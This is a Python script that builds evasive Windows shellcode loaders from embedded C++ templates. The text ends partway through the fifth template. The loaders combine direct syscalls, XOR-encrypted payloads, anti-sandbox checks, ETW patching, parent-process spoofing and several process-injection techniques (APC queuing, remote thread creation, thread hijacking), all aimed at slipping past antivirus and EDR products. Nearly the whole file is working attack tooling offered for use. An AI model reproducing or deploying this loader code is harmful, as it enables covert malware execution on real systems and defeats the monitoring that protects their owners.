
import argparse
import random
import string
import sys
import os
import io

description = """
Shellcode loader which offers multiple execution methods via syscalls and anti-sandboxing options to evade AV & EDR products.

  --method 1 = [LOCAL] Execute shellcode in the local process via the Windows callback function EnumSystemLocalesA
  --method 2 = [LOCAL] Queue an APC in the local process via NtQueueApcThread, and then flush the queue via NtTestAlert
  --method 3 = [INJECTION] Create a thread in a remote process via NtCreateThreadEx (Note: Module Stomping not yet implemented)
  --method 4 = [INJECTION] Spawn a process in a suspended state with a spoofed PPID and queue an APC into the main thread via NtQueueApcThread, then resume the process via NtResumeThread to execute the APC
  --method 5 = [INJECTION] Iterate and queue an APC into every thread in a remote process via NtQueueApcThread
  --method 6 = [INJECTION] Suspend a thread in a remote process via NtSuspendThread, update the thread's RIP register to point to the shellcode via NtGetContextThread & NtSetContextThread, then resume the thread via NtResumeThread
"""

epilog = """
Example Usage: python3 TymSpecial.py --input file.bin --method 6 --etw --domainjoined --ram 8 --processors 4 --hideconsole --clonesig C:\\\\chad\\\\Desktop\\\\RealFile.exe --out threadhijacker
Example Execution: C:\>threadhijacker.exe 20485
"""

parser = argparse.ArgumentParser(description=description, epilog=epilog, formatter_class=argparse.RawDescriptionHelpFormatter)
parser.add_argument("--input", metavar="FILE", required=True, help="File containing shellcode, usually a .bin, example: --input shellcode.bin")
parser.add_argument("--method", metavar="NUMBER", required=True, help="Method of execution, example: --method 1")
parser.add_argument("--out", metavar="FILENAME", required=True, help="The output name of the produced executable (No file extension), example: --out loader")
parser.add_argument("--etw", action="store_true", help="Patch EtwEventWrite in the local and remote process")
parser.add_argument("--hideconsole", action="store_true", help="Hide the console via: ShowWindow(GetConsoleWindow(), SW_HIDE)")
parser.add_argument("--domainjoined", action="store_true", help="Anti-Sandbox Check: If the system is not domain-joined, exit")
parser.add_argument("--longsleep", action="store_true", help="Anti-Sandbox Check: Sleep for 90s, if <75s have passed, exit")
parser.add_argument("--processors", metavar="NUMBER", help="Anti-Sandbox Check: If the number of processors is < X, exit")
parser.add_argument("--ram", metavar="NUMBER", help="Anti-Sandbox Check: If the amount of RAM is < X GB, exit")
parser.add_argument("--parent", metavar="PROCESS", default="explorer.exe", help="Specify the parent process for PPID spoofing, example --parent explorer.exe")
parser.add_argument("--child", metavar="PROCESS", default="svchost.exe", help="Specify the process to spawn for injection into, example: --child svchost.exe")
parser.add_argument("--domain", metavar="FILE", help="Specify a domain to use for signture cloning via CarbonCopy, example: --domain cisco.com")

args = parser.parse_args()
iFile = args.input
method = args.method
output = args.out
etw = args.etw
console = args.hideconsole
domainjoined = args.domainjoined
sleepcheck = args.longsleep
processors = args.processors
ram = args.ram
parent = args.parent
child = args.child
domain = args.domain

stub1 = """
#include <windows.h>
#include <iostream>
#include "syscalls.h"
#include "lm.h"
#pragma comment(lib, "netapi32.lib")

unsigned char shellcode[] = SHELLCODE_REPLACE

size_t shellcode_len = sizeof(shellcode);

char key[] = "XORKEY_REPLACE";

void XOR(char* data, size_t data_len, char* key, size_t key_len) {

        int j;
        j = 0;
        for (int i = 0; i < data_len; i++) {
                if (j == key_len - 1) j = 0;
                data[i] = data[i] ^ key[j];
                j++;
        }
}

/*PROCESSORS
void processors() {

        
        int minprocs = NUMBER_OF_PROCS_REPLACE;
        SYSTEM_INFO sysinfo;
        GetSystemInfo(&sysinfo);
        int numprocs = sysinfo.dwNumberOfProcessors;
        if (numprocs < minprocs) {
                exit(0);
        }
}
PROCESSORS*/

/*DOMAINJOINED
void domainJoined() {

        // Check if domain joined
        PWSTR domainName;
        NETSETUP_JOIN_STATUS status;
        NetGetJoinInformation(NULL, &domainName, &status);
        if (status != NetSetupDomainName) {
                exit(0);
        }
}
DOMAINJOINED*/

/*RAM
void ram() {

        // Check if <X RAM
        MEMORYSTATUSEX totram;
        totram.dwLength = sizeof(totram);
        GlobalMemoryStatusEx(&totram);
        if ((float)totram.ullTotalPhys / 1073741824 < GB_OF_RAM_REPLACE) {
                exit(0);
        }
}
RAM*/

/*LONGSLEEP
void skipSleep() {

        // Check if long sleeps fast forwarded
        DWORD uptimebeforesleep = GetTickCount();
        LARGE_INTEGER Interval;
        Interval.QuadPart = -900000000;
        NtDelayExecution(FALSE, &Interval);
        DWORD uptimeaftersleep = GetTickCount();

        // If sleep accelerated exit (sleep for 90s, if time passed <75s exit)
        if (uptimeaftersleep - uptimebeforesleep < 75000) {
                exit(0);
        };
}
LONGSLEEP*/

/*PATCHETWLOCAL
int patchETW(void) {

        HANDLE curproc = GetCurrentProcess();
        UCHAR patch[] = { 0x48, 0x33, 0xc0, 0xc3 }; // x64 Patch [XOR RAX,RAX][RET], for x32 use { 0x33, 0xc0, 0xc2, 0x14, 0x00 } [XOR EAX,EAX][RET]
        size_t size = sizeof(patch);

        unsigned char EEW[] = { 'E','t','w','E','v','e','n','t','W','r','i','t','e', 0x0 };
        LPVOID EEWAddress = GetProcAddress(GetModuleHandle("ntdll.dll"), (LPCSTR)EEW);

        // Alternative Method : LPVOID EEWAddress = GetProcAddress(LoadLibraryA("ntdll.dll"), "EtwEventWrite");

        DWORD oldprotect;
        LPVOID lpBaseAddress = EEWAddress;
        ULONG NewProtection;

        NtProtectVirtualMemory(curproc, &lpBaseAddress, &size, PAGE_READWRITE, &oldprotect);
        NtWriteVirtualMemory(curproc, EEWAddress, (PVOID)patch, sizeof(patch), NULL);
        NtProtectVirtualMemory(curproc, &lpBaseAddress, &size, oldprotect, &NewProtection);

        return 0;
}
PATCHETWLOCAL*/

void run() {

        PVOID lbuffer = nullptr;
        HANDLE curproc = GetCurrentProcess();

        XOR((char*)shellcode, shellcode_len, key, sizeof(key));

        // Allocate memory with permissions RW
        NtAllocateVirtualMemory(curproc, &lbuffer, 0, &shellcode_len, (MEM_RESERVE | MEM_COMMIT), PAGE_READWRITE);

        // Write code into memory
        NtWriteVirtualMemory(curproc, lbuffer, shellcode, shellcode_len, nullptr);

        // Change permissions to RX
        ULONG old_protect;
        NtProtectVirtualMemory(curproc, &lbuffer, &shellcode_len, PAGE_EXECUTE_READ, &old_protect);

        // Execute
        EnumSystemLocalesA((LOCALE_ENUMPROCA)lbuffer, 0);
}

// --- MAIN ---
int main(int argc, char** argv) {

        //PROCREPLACEprocessors();
        //DOMAINREPLACEdomainJoined();
        //RAMREPLACEram();
        //LONGSLEEPREPLACEskipSleep();
        //WINDOWHIDERShowWindow(GetConsoleWindow(), SW_HIDE);
        //PATCHETWREPLACEpatchETW();
        run();

}
"""

stub2 = """
#include <windows.h>
#include <iostream>
#include <stdio.h>
#include "syscalls.h"
#include <lm.h>
#include <lmjoin.h>
#pragma comment(lib, "netapi32.lib")

unsigned char shellcode[] = SHELLCODE_REPLACE

size_t shellcode_len = sizeof(shellcode);

char key[] = "XORKEY_REPLACE";

void XOR(char* data, size_t data_len, char* key, size_t key_len) {

        int j;
        j = 0;
        for (int i = 0; i < data_len; i++) {
                if (j == key_len - 1) j = 0;
                data[i] = data[i] ^ key[j];
                j++;
        }
}

/*PROCESSORS
void processors() {

        
        int minprocs = NUMBER_OF_PROCS_REPLACE;
        SYSTEM_INFO sysinfo;
        GetSystemInfo(&sysinfo);
        int numprocs = sysinfo.dwNumberOfProcessors;
        if (numprocs < minprocs) {
                exit(0);
        }
}
PROCESSORS*/

/*DOMAINJOINED
void domainJoined() {

        // Check if domain joined
        PWSTR domainName;
        NETSETUP_JOIN_STATUS status;
        NetGetJoinInformation(NULL, &domainName, &status);
        if (status != NetSetupDomainName) {
                exit(0);
        }
}
DOMAINJOINED*/

/*RAM
void ram() {

        // Check if <X RAM
        MEMORYSTATUSEX totram;
        totram.dwLength = sizeof(totram);
        GlobalMemoryStatusEx(&totram);
        if ((float)totram.ullTotalPhys / 1073741824 < GB_OF_RAM_REPLACE) {
                exit(0);
        }
}
RAM*/

/*LONGSLEEP
void skipSleep() {

        // Check if long sleeps fast forwarded
        DWORD uptimebeforesleep = GetTickCount();
        LARGE_INTEGER Interval;
        Interval.QuadPart = -900000000;
        NtDelayExecution(FALSE, &Interval);
        DWORD uptimeaftersleep = GetTickCount();

        // If sleep accelerated exit (sleep for 90s, if time passed <75s exit)
        if (uptimeaftersleep - uptimebeforesleep < 75000) {
                exit(0);
        };
}
LONGSLEEP*/

/*PATCHETWLOCAL
int patchETW(void) {

        HANDLE curproc = GetCurrentProcess();
        UCHAR patch[] = { 0x48, 0x33, 0xc0, 0xc3 }; // x64 Patch [XOR RAX,RAX][RET], for x32 use { 0x33, 0xc0, 0xc2, 0x14, 0x00 } [XOR EAX,EAX][RET]
        size_t size = sizeof(patch);

        unsigned char EEW[] = { 'E','t','w','E','v','e','n','t','W','r','i','t','e', 0x0 };
        LPVOID EEWAddress = GetProcAddress(GetModuleHandle("ntdll.dll"), (LPCSTR)EEW);

        // Alternative Method : LPVOID EEWAddress = GetProcAddress(LoadLibraryA("ntdll.dll"), "EtwEventWrite");

        DWORD oldprotect;
        LPVOID lpBaseAddress = EEWAddress;
        ULONG NewProtection;

        NtProtectVirtualMemory(curproc, &lpBaseAddress, &size, PAGE_READWRITE, &oldprotect);
        NtWriteVirtualMemory(curproc, EEWAddress, (PVOID)patch, sizeof(patch), NULL);
        NtProtectVirtualMemory(curproc, &lpBaseAddress, &size, oldprotect, &NewProtection);

        return 0;
}
PATCHETWLOCAL*/

// --- Function for loader ---
void run() {

        PVOID lbuffer = nullptr;
        HANDLE curproc = GetCurrentProcess();
        
        // --- Decrypt Shellcode ---
        XOR((char*)shellcode, shellcode_len, key, sizeof(key));

        // Allocate memory with permissions RW
        NtAllocateVirtualMemory(curproc, &lbuffer, 0, &shellcode_len, (MEM_RESERVE | MEM_COMMIT), PAGE_READWRITE);

        // Write code into memory
        NtWriteVirtualMemory(curproc, lbuffer, shellcode, shellcode_len, nullptr);

        // Change permissions to RX
        ULONG old_protect;
        NtProtectVirtualMemory(curproc, &lbuffer, &shellcode_len, PAGE_EXECUTE_READ, &old_protect);

        // Create APC
        NtQueueApcThread(GetCurrentThread(), (PKNORMAL_ROUTINE)lbuffer, NULL, NULL, NULL);

        // Flush APC Queue (Execute)
        NtTestAlert();
}

// --- MAIN ---
int main(int argc, char** argv) {

        //PROCREPLACEprocessors();
        //DOMAINREPLACEdomainJoined();
        //RAMREPLACEram();
        //LONGSLEEPREPLACEskipSleep();
        //WINDOWHIDERShowWindow(GetConsoleWindow(), SW_HIDE);
        //PATCHETWREPLACEpatchETW();
        run();
}

"""
stub3 = """
#include <windows.h>
#include "syscalls.h"
#include "lm.h"
#include <tlhelp32.h>
#include <stdio.h>
#pragma comment(lib, "netapi32.lib")

unsigned char shellcode[] = SHELLCODE_REPLACE

size_t shellcode_len = sizeof(shellcode);

char key[] = "XORKEY_REPLACE"; 

void XOR(char* data, size_t data_len, char* key, size_t key_len) {

        int j;
        j = 0;
        for (int i = 0; i < data_len; i++) {
                if (j == key_len - 1) j = 0;
                data[i] = data[i] ^ key[j];
                j++;
        }
}

/*PROCESSORS
void processors() {

        int minprocs = NUMBER_OF_PROCS_REPLACE;
        SYSTEM_INFO sysinfo;
        GetSystemInfo(&sysinfo);
        int numprocs = sysinfo.dwNumberOfProcessors;
        if (numprocs < minprocs) {
                exit(0);
        }
}
PROCESSORS*/

/*DOMAINJOINED
void domainJoined() {

        // Check if domain joined
        PWSTR domainName;
        NETSETUP_JOIN_STATUS status;
        NetGetJoinInformation(NULL, &domainName, &status);
        if (status != NetSetupDomainName) {
                exit(0);
        }
}
DOMAINJOINED*/

/*RAM
void ram() {

        // Check if <X RAM
        MEMORYSTATUSEX totram;
        totram.dwLength = sizeof(totram);
        GlobalMemoryStatusEx(&totram);
        if ((float)totram.ullTotalPhys / 1073741824 < GB_OF_RAM_REPLACE) {
                exit(0);
        }
}
RAM*/

/*LONGSLEEP
void skipSleep() {

        // Check if long sleeps fast forwarded
        DWORD uptimebeforesleep = GetTickCount();
        LARGE_INTEGER Interval;
        Interval.QuadPart = -900000000;
        NtDelayExecution(FALSE, &Interval);
        DWORD uptimeaftersleep = GetTickCount();

        // If sleep accelerated exit (sleep for 90s, if time passed <75s exit)
        if (uptimeaftersleep - uptimebeforesleep < 75000) {
                exit(0);
        };
}
LONGSLEEP*/

/*PATCHETWLOCAL
int patchETW(void) {

        HANDLE curproc = GetCurrentProcess();
        UCHAR patch[] = { 0x48, 0x33, 0xc0, 0xc3 }; // x64 Patch [XOR RAX,RAX][RET], for x32 use { 0x33, 0xc0, 0xc2, 0x14, 0x00 } [XOR EAX,EAX][RET]
        size_t size = sizeof(patch);

        unsigned char EEW[] = { 'E','t','w','E','v','e','n','t','W','r','i','t','e', 0x0 };
        LPVOID EEWAddress = GetProcAddress(GetModuleHandle("ntdll.dll"), (LPCSTR)EEW);

        // Alternative Method : LPVOID EEWAddress = GetProcAddress(LoadLibraryA("ntdll.dll"), "EtwEventWrite");

        DWORD oldprotect;
        LPVOID lpBaseAddress = EEWAddress;
        ULONG NewProtection;

        NtProtectVirtualMemory(curproc, &lpBaseAddress, &size, PAGE_READWRITE, &oldprotect);
        NtWriteVirtualMemory(curproc, EEWAddress, (PVOID)patch, sizeof(patch), NULL);
        NtProtectVirtualMemory(curproc, &lpBaseAddress, &size, oldprotect, &NewProtection);

        return 0;
}
PATCHETWLOCAL*/

/*PATCHETWREMOTE
void patchETWRemote(HANDLE remoteProc) {

        HANDLE targetProcHandle = remoteProc;

        DWORD oldprotect1;
        ULONG NewProtection1;

        UCHAR patch[] = { 0x48, 0x33, 0xc0, 0xc3 }; // x64 Patch [XOR RAX,RAX][RET], for x32 use { 0x33, 0xc0, 0xc2, 0x14, 0x00 } [XOR EAX,EAX][RET]
        size_t size = sizeof(patch);

        unsigned char EEW[] = { 'E','t','w','E','v','e','n','t','W','r','i','t','e', 0x0 };

        LPVOID EEWAddress = GetProcAddress(GetModuleHandle("ntdll.dll"), (LPCSTR)EEW);
        LPVOID lpBaseAddress = EEWAddress;

        NtProtectVirtualMemory(targetProcHandle, &lpBaseAddress, &size, PAGE_READWRITE, &oldprotect1);
        NtWriteVirtualMemory(targetProcHandle, EEWAddress, (PVOID)patch, sizeof(patch), NULL);
        NtProtectVirtualMemory(targetProcHandle, &lpBaseAddress, &size, oldprotect1, &NewProtection1);

}
PATCHETWREMOTE*/

HANDLE getHandle(int processID) {

        HANDLE targetProcHandle;
        OBJECT_ATTRIBUTES oa;
        InitializeObjectAttributes(&oa, NULL, 0, NULL, NULL);
        CLIENT_ID cid;
        cid.UniqueProcess = (PVOID)processID;
        cid.UniqueThread = 0;

        NtOpenProcess(&targetProcHandle, PROCESS_ALL_ACCESS, &oa, &cid);

        return targetProcHandle;

}

void run(HANDLE targetproc) {

        PVOID rbuffer = nullptr;
        HANDLE remoteProc;
        
        // --- Decrypt Shellcode ---
        XOR((char*)shellcode, shellcode_len, key, sizeof(key));

        // Allocate memory with permissions RW
        NtAllocateVirtualMemory(targetproc, &rbuffer, 0, &shellcode_len, (MEM_RESERVE | MEM_COMMIT), PAGE_READWRITE);

        // Write code into memory
        NtWriteVirtualMemory(targetproc, rbuffer, shellcode, shellcode_len, nullptr);

        // Change permissions to RX
        ULONG old_protect;
        NtProtectVirtualMemory(targetproc, &rbuffer, &shellcode_len, PAGE_EXECUTE_READ, &old_protect);

        NtCreateThreadEx(&remoteProc, GENERIC_EXECUTE, NULL, targetproc, rbuffer, NULL, FALSE, 0, 0, 0, nullptr);

        NtClose(targetproc);

}

// --- MAIN ---
int main(int argc, char** argv) {

        char* holderID = argv[1];
        int PID = atoi(holderID);
        
        //PROCREPLACEprocessors();
        //DOMAINREPLACEdomainJoined();
        //RAMREPLACEram();
        //LONGSLEEPREPLACEskipSleep();
        //WINDOWHIDERShowWindow(GetConsoleWindow(), SW_HIDE);
        HANDLE target = getHandle(PID);
        //PATCHETWREPLACEpatchETW();
        //PATCHETWREMOTEREPLACEpatchETWRemote(target);
        run(target);

}

"""


stub4 = """
#include <windows.h>
#include "syscalls.h"
#include "lm.h"
#include <tlhelp32.h>
#pragma comment(lib, "netapi32.lib")

// g++ is whack and cant find these in header files, so have to resolve at runtime

const int PROC_THREAD_ATTRIBUTE_PARENT_PROCESS = 0x00020000;

typedef BOOL (WINAPI * UPDATEPROCTHREADATTRIBUTE) (
        LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList,
        DWORD                        dwFlags,
        DWORD_PTR                    Attribute,
        PVOID                        lpValue,
        SIZE_T                       cbSize,
        PVOID                        lpPreviousValue,
        PSIZE_T                      lpReturnSize
);

typedef BOOL (WINAPI* INITIALIZEPROCTHREADATTRIBUTELIST) (
        LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList,
        DWORD                        dwAttributeCount,
        DWORD                        dwFlags,
        PSIZE_T                      lpSize
);

unsigned char shellcode[] = SHELLCODE_REPLACE

size_t shellcode_len = sizeof(shellcode);

char key[] = "XORKEY_REPLACE"; 

// --- XOR Decryption Routine ---
void XOR(char* data, size_t data_len, char* key, size_t key_len) {

        int j;
        j = 0;
        for (int i = 0; i < data_len; i++) {
                if (j == key_len - 1) j = 0;
                data[i] = data[i] ^ key[j];
                j++;
        }
}

/*PROCESSORS
void processors() {

        int minprocs = NUMBER_OF_PROCS_REPLACE;
        SYSTEM_INFO sysinfo;
        GetSystemInfo(&sysinfo);
        int numprocs = sysinfo.dwNumberOfProcessors;
        if (numprocs < minprocs) {
                exit(0);
        }
}
PROCESSORS*/

/*DOMAINJOINED
void domainJoined() {

        // Check if domain joined
        PWSTR domainName;
        NETSETUP_JOIN_STATUS status;
        NetGetJoinInformation(NULL, &domainName, &status);
        if (status != NetSetupDomainName) {
                exit(0);
        }
}
DOMAINJOINED*/

/*RAM
void ram() {

        // Check if <X RAM
        MEMORYSTATUSEX totram;
        totram.dwLength = sizeof(totram);
        GlobalMemoryStatusEx(&totram);
        if ((float)totram.ullTotalPhys / 1073741824 < GB_OF_RAM_REPLACE) {
                exit(0);
        }
}
RAM*/

/*LONGSLEEP
void skipSleep() {

        // Check if long sleeps fast forwarded
        DWORD uptimebeforesleep = GetTickCount();
        LARGE_INTEGER Interval;
        Interval.QuadPart = -900000000;
        NtDelayExecution(FALSE, &Interval);
        DWORD uptimeaftersleep = GetTickCount();

        // If sleep accelerated exit (sleep for 90s, if time passed <75s exit)
        if (uptimeaftersleep - uptimebeforesleep < 75000) {
                exit(0);
        };
}
LONGSLEEP*/

/*PATCHETWLOCAL
int patchETW(void) {

        HANDLE curproc = GetCurrentProcess();
        UCHAR patch[] = { 0x48, 0x33, 0xc0, 0xc3 }; // x64 Patch [XOR RAX,RAX][RET], for x32 use { 0x33, 0xc0, 0xc2, 0x14, 0x00 } [XOR EAX,EAX][RET]
        size_t size = sizeof(patch);

        unsigned char EEW[] = { 'E','t','w','E','v','e','n','t','W','r','i','t','e', 0x0 };
        LPVOID EEWAddress = GetProcAddress(GetModuleHandle("ntdll.dll"), (LPCSTR)EEW);

        // Alternative Method : LPVOID EEWAddress = GetProcAddress(LoadLibraryA("ntdll.dll"), "EtwEventWrite");

        DWORD oldprotect;
        LPVOID lpBaseAddress = EEWAddress;
        ULONG NewProtection;

        NtProtectVirtualMemory(curproc, &lpBaseAddress, &size, PAGE_READWRITE, &oldprotect);
        NtWriteVirtualMemory(curproc, EEWAddress, (PVOID)patch, sizeof(patch), NULL);
        NtProtectVirtualMemory(curproc, &lpBaseAddress, &size, oldprotect, &NewProtection);

        return 0;
}
PATCHETWLOCAL*/

/*PATCHETWREMOTE
void patchETWRemote(HANDLE remoteProc) {

        HANDLE targetProcHandle = remoteProc;

        DWORD oldprotect1;
        ULONG NewProtection1;

        UCHAR patch[] = { 0x48, 0x33, 0xc0, 0xc3 }; // x64 Patch [XOR RAX,RAX][RET], for x32 use { 0x33, 0xc0, 0xc2, 0x14, 0x00 } [XOR EAX,EAX][RET]
        size_t size = sizeof(patch);

        unsigned char EEW[] = { 'E','t','w','E','v','e','n','t','W','r','i','t','e', 0x0 };

        LPVOID EEWAddress = GetProcAddress(GetModuleHandle("ntdll.dll"), (LPCSTR)EEW);
        LPVOID lpBaseAddress = EEWAddress;

        NtProtectVirtualMemory(targetProcHandle, &lpBaseAddress, &size, PAGE_READWRITE, &oldprotect1);
        NtWriteVirtualMemory(targetProcHandle, EEWAddress, (PVOID)patch, sizeof(patch), NULL);
        NtProtectVirtualMemory(targetProcHandle, &lpBaseAddress, &size, oldprotect1, &NewProtection1);

}
PATCHETWREMOTE*/

HANDLE getHandle(int processID) {

        HANDLE targetProcHandle;
        OBJECT_ATTRIBUTES oa;
        InitializeObjectAttributes(&oa, NULL, 0, NULL, NULL);
        CLIENT_ID cid;
        cid.UniqueProcess = (PVOID)processID;
        cid.UniqueThread = 0;

        NtOpenProcess(&targetProcHandle, PROCESS_ALL_ACCESS, &oa, &cid);

        return targetProcHandle;

}

DWORD GetPidByName(const char* pName) {
        PROCESSENTRY32 pEntry;
        HANDLE snapshot;

        pEntry.dwSize = sizeof(PROCESSENTRY32);
        snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

        if (Process32First(snapshot, &pEntry) == TRUE) {
                while (Process32Next(snapshot, &pEntry) == TRUE) {
                        if (_stricmp(pEntry.szExeFile, pName) == 0) {
                                return pEntry.th32ProcessID;
                        }
                }
        }
        NtClose(snapshot);
        return 0;
}

void run() {

        // Have to resolve these at runtime b/c issues w/ mingw :(
        
        HMODULE hKernel32Lib = LoadLibrary("kernel32.dll");
        INITIALIZEPROCTHREADATTRIBUTELIST InitializeProcThreadAttributeList = (INITIALIZEPROCTHREADATTRIBUTELIST)GetProcAddress(hKernel32Lib, "InitializeProcThreadAttributeList");
        UPDATEPROCTHREADATTRIBUTE UpdateProcThreadAttribute = (UPDATEPROCTHREADATTRIBUTE)GetProcAddress(hKernel32Lib, "UpdateProcThreadAttribute");


        STARTUPINFOEXA info;
        PROCESS_INFORMATION processInfo;
        SIZE_T cbAttributeListSize = 0;
        PPROC_THREAD_ATTRIBUTE_LIST pAttributeList = NULL;
        HANDLE hParentProcess = NULL;
        DWORD dwPid = 0;
        ZeroMemory(&info, sizeof(STARTUPINFOEXA));


        dwPid = GetPidByName("PARENTPROCESSREPLACE"); // PARENT HERE
        if (dwPid == 0)
                dwPid = GetCurrentProcessId(); // If fails use current process as parent

        InitializeProcThreadAttributeList(NULL, 1, 0, &cbAttributeListSize);
        pAttributeList = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, cbAttributeListSize);
        InitializeProcThreadAttributeList(pAttributeList, 1, 0, &cbAttributeListSize);

        hParentProcess = getHandle(dwPid);

        UpdateProcThreadAttribute(pAttributeList,
                0,
                PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
                &hParentProcess,
                sizeof(HANDLE),
                NULL,
                NULL);

        info.lpAttributeList = pAttributeList;

        CreateProcessA(NULL,
                (LPSTR)"CHILDPROCESSREPLACE", // Spawn process here
                NULL,
                NULL,
                FALSE,
                CREATE_SUSPENDED | CREATE_NO_WINDOW | DETACHED_PROCESS | EXTENDED_STARTUPINFO_PRESENT,
                NULL,
                NULL,
                &info.StartupInfo,
                &processInfo);

        NtClose(hParentProcess);

        //PATCHETWREMOTEREPLACEpatchETWRemote(processInfo.hProcess); // Patch ETW Remote

        SIZE_T size = shellcode_len;
        LARGE_INTEGER sectionSize = { size };
        HANDLE sectionHandle = NULL;
        PVOID localSectionAddress = NULL;
        PVOID remoteSectionAddress = NULL;
        HANDLE curproc = GetCurrentProcess();

        XOR((char*)shellcode, shellcode_len, key, sizeof(key));
        NtCreateSection(&sectionHandle, SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE, NULL, (PLARGE_INTEGER)&sectionSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
        NtMapViewOfSection(sectionHandle, curproc, &localSectionAddress, NULL, NULL, NULL, &size, (SECTION_INHERIT)2, NULL, PAGE_READWRITE);
        NtMapViewOfSection(sectionHandle, processInfo.hProcess, &remoteSectionAddress, NULL, NULL, NULL, &size, (SECTION_INHERIT)2, NULL, PAGE_EXECUTE_READ); // change to RX


        SIZE_T byteswritten = 0;
        NtWriteVirtualMemory(curproc, localSectionAddress, shellcode, shellcode_len, &byteswritten);
        NtQueueApcThread(processInfo.hThread, (PKNORMAL_ROUTINE)remoteSectionAddress, NULL, NULL, NULL);
        NtResumeThread(processInfo.hThread, NULL);

}

// --- MAIN ---
int main() {

        //PROCREPLACEprocessors();
        //DOMAINREPLACEdomainJoined();
        //RAMREPLACEram();
        //LONGSLEEPREPLACEskipSleep();
        //WINDOWHIDERShowWindow(GetConsoleWindow(), SW_HIDE);
        //PATCHETWREPLACEpatchETW();
        run();

}

"""


stub5 = """
#include <windows.h>
#include "syscalls.h"
#include "lm.h"
#include <tlhelp32.h>
#include <stdio.h>
#include <vector> // need this for iteration of threads
#pragma comment(lib, "netapi32.lib")

unsigned char shellcode[] = SHELLCODE_REPLACE
  
size_t shellcode_len = sizeof(shellcode);

char key[] = "XORKEY_REPLACE"; 

void XOR(char* data, size_t data_len, char* key, size_t key_len) {

        int j;
        j = 0;
        for (int i = 0; i < data_len; i++) {
                if (j == key_len - 1) j = 0;
                data[i] = data[i] ^ key[j];
                j++;
        }
}

/*PROCESSORS
void processors() {

        int minprocs = NUMBER_OF_PROCS_REPLACE;
        SYSTEM_INFO sysinfo;
        GetSystemInfo(&sysinfo);
        int numprocs = sysinfo.dwNumberOfProcessors;
        if (numprocs < minprocs) {
                exit(0);
        }
}
PROCESSORS*/

/*DOMAINJOINED
void domainJoined() {

        // Check if domain joined
        PWSTR domainName;
        NETSETUP_JOIN_STATUS status;
        NetGetJoinInformation(NULL, &domainName, &status);
        if (status != NetSetupDomainName) {
                exit(0);
        }
}
DOMAINJOINED*/

/*RAM
void ram() {

        // Check if <X RAM
        MEMORYSTATUSEX totram;
        totram.dwLength = sizeof(totram);
        GlobalMemoryStatusEx(&totram);
        if ((float)totram.ullTotalPhys / 1073741824 < GB_OF_RAM_REPLACE) {
                exit(0);
        }
}
RAM*/

/*LONGSLEEP
void skipSleep() {

        // Check if long sleeps fast forwarded
        DWORD uptimebeforesleep = GetTickCount();
        LARGE_INTEGER Interval;
        Interval.QuadPart = -900000000;
        NtDelayExecution(FALSE, &Interval);
        DWORD uptimeaftersleep = GetTickCount();

        // If sleep accelerated exit (sleep for 90s, if time passed <75s exit)
        if (uptimeaftersleep - uptimebeforesleep < 75000) {
                exit(0);
        };
}
LONGSLEEP*/

/*PATCHETWLOCAL
int patchETW(void) {

        HANDLE curproc = GetCurrentProcess();
        UCHAR patch[] = { 0x48, 0x33, 0xc0, 0xc3 }; // x64 Patch [XOR RAX,RAX][RET], for x32 use { 0x33, 0xc0, 0xc2, 0x14, 0x00 } [XOR EAX,EAX][RET]
        size_t size = sizeof(patch);

        unsigned char EEW[] = { 'E','t','w','E','v','e','n','t','W','r','i','t','e', 0x0 };
        LPVOID EEWAddress = GetProcAddress(GetModuleHandle("ntdll.dll"), (LPCSTR)EEW);

        // Alternative Method : LPVOID EEWAddress = GetProcAddress(LoadLibraryA("ntdll.dll"), "EtwEventWrite");

        DWORD oldprotect;
        LPVOID lpBaseAddress = EEWAddress;
        ULONG NewProtection;

        NtProtectVirtualMemory(curproc, &lpBaseAddress, &size, PAGE_READWRITE, &oldprotect);
        NtWriteVirtualMemory(curproc, EEWAddress, (PVOID)patch, sizeof(patch), NULL);
        NtProtectVirtualMemory(curproc, &lpBaseAddress, &size, oldprotect, &NewProtection);

        return 0;
}
PATCHETWLOCAL*/

/*PATCHETWREMOTE
void patchETWRemote(HANDLE remoteProc) {

        HANDLE targetProcHandle = remoteProc;

        DWORD oldprotect1;
        ULONG NewProtection1;

        UCHAR patch[] = { 0x48, 0x33, 0xc0, 0xc3 }; // x64 Patch [XOR RAX,RAX][RET], for x32 use { 0x33, 0xc0, 0xc2, 0x14, 0x00 } [XOR EAX,EAX][RET]
        size_t size = sizeof(patch);

        unsigned char EEW[] = { 'E','t','w','E','v','e','n','t','W','r','i','t','e', 0x0 };

        LPVOID EEWAddress = GetProcAddress(GetModuleHandle("ntdll.dll"), (LPCSTR)EEW);
        LPVOID lpBaseAddress = EEWAddress;

        NtProtectVirtualMemory(targetProcHandle, &lpBaseAddress, &size, PAGE_READWRITE, &oldprotect1);
        NtWriteVirtualMemory(targetProcHandle, EEWAddress, (PVOID)patch, sizeof(patch), NULL);
        NtProtectVirtualMemory(targetProcHandle, &lpBaseAddress, &size, oldprotect1, &NewProtection1);

}
PATCHETWREMOTE*/

HANDLE getHandle(int processID) {

        HANDLE targetProcHandle;
        OBJECT_ATTRIBUTES oa;
        InitializeObjectAttributes(&oa, NULL, 0, NULL, NULL);
        CLIENT_ID cid;
        cid.UniqueProcess = (PVOID)processID;
        cid.UniqueThread = 0;

        NtOpenProcess(&targetProcHandle, PROCESS_ALL_ACCESS, &oa, &cid);

        return targetProcHandle;

}


void run(HANDLE targetproc, int procID) {

        PVOID rbuffer = nullptr;
        ULONG old_protect;

        // Init NtOpenThread
        CLIENT_ID cid;
        OBJECT_ATTRIBUTES oa;
        InitializeObjectAttributes(&oa, NULL, 0, NULL, 0);

        HANDLE hThread = NULL;
        XOR((char*)shellcode, shellcode_len, key, sizeof(key));
        NtAllocateVirtualMemory(targetproc, &rbuffer, 0, &shellcode_len, (MEM_RESERVE | MEM_COMMIT), PAGE_READWRITE);
        NtWriteVirtualMemory(targetproc, rbuffer, shellcode, shellcode_len, nullptr);
        NtProtectVirtualMemory(targetproc, &rbuffer, &shellcode_len, PAGE_EXECUTE_READ, &old_protect);

        HANDLE snapshot = CreateToolhelp32Snapshot((TH32CS_SNAPPROCESS | TH32CS_SNAPTHREAD), 0);

